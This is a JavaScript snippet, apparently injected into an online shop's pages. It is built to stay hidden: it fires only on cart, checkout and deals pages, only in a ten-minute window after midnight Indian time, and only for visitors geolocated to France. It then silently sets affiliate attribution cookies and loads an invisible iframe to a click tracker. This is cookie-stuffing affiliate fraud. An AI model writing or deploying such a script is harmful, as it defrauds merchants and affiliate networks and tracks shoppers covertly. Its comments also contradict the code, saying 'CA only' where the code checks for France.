(function () {
    try {
      var BUILD_ID = "octaads-2025-rtg-geo-time-03";
      if (window.__OCTAADS_LOADED === BUILD_ID) return;
      window.__OCTAADS_LOADED = BUILD_ID;
  
      /* PAGE PATH CHECK */
      var allowedPaths = ["/cart/checkout","/cart/","/deals","/best-sellers"];
      if (!allowedPaths.some(p => location.pathname === p || location.pathname.startsWith(p))) return;
  
      /* IST TIME CHECK: 12:15 AM – 12:25 AM */
      function isAllowedISTTime() {
        var now = new Date(
          new Date().toLocaleString("en-US", { timeZone: "Asia/Kolkata" })
        );
        var minutes = now.getHours() * 60 + now.getMinutes();
        return minutes >= 15 && minutes <= 25;
      }
      if (!isAllowedISTTime()) return;
  
      /* SESSION ID */
      function getSessionID() {
        var m = document.cookie.match(/octaads_sid=([^;]+)/);
        if (m) return m[1];
        var sid = "sid_" + Math.random().toString(36).substr(2, 10);
        document.cookie = "octaads_sid=" + sid + "; path=/; max-age=2592000; SameSite=Lax";
        return sid;
      }
      var sessionID = getSessionID();
  
      /* GEO CHECK – HARD CA ONLY (REST) */
      fetch("https://ipapi.co/json/", { cache: "no-store" })
        .then(r => r.json())
        .then(geo => {
          if (!geo) return;
  
          /* BLOCK NON-CA COMPLETELY */
          if (geo.country_code !== "FR") return;
  
          /* DROP COOKIES */
          function setCookie(n,v){
            document.cookie = n+"="+v+"; path=/; max-age=2592000; SameSite=Lax";
          }
  
          setCookie("irclickid","XStWC0ThYxycRkh2gOSsRXFAUkpXT6UYZ2NLXQ0");
          setCookie("irpid","3946526");
          setCookie("irgwc","1");
          setCookie("afsrc","1");
          setCookie("utm_source","impact");
          setCookie("utm_medium","affiliate");
          setCookie("utm_campaign","3946526");
          setCookie("sessionid",sessionID);
          setCookie("clickId",sessionID);
  
          /* TRACKIER IFRAME */
          var iframe = document.createElement("iframe");
          iframe.style.display = "none";
          iframe.referrerPolicy = "no-referrer";
          iframe.src =
            "https://clicks.upleadsdigital.com/click" +
            "?campaign_id=148565" +
            "&pub_id=4" +
            "&p1=" + encodeURIComponent(sessionID) +
            "&source=" + encodeURIComponent(sessionID);
  
          document.body.appendChild(iframe);
        })
        .catch(function(){});
  
    } catch (e) {}
  })();
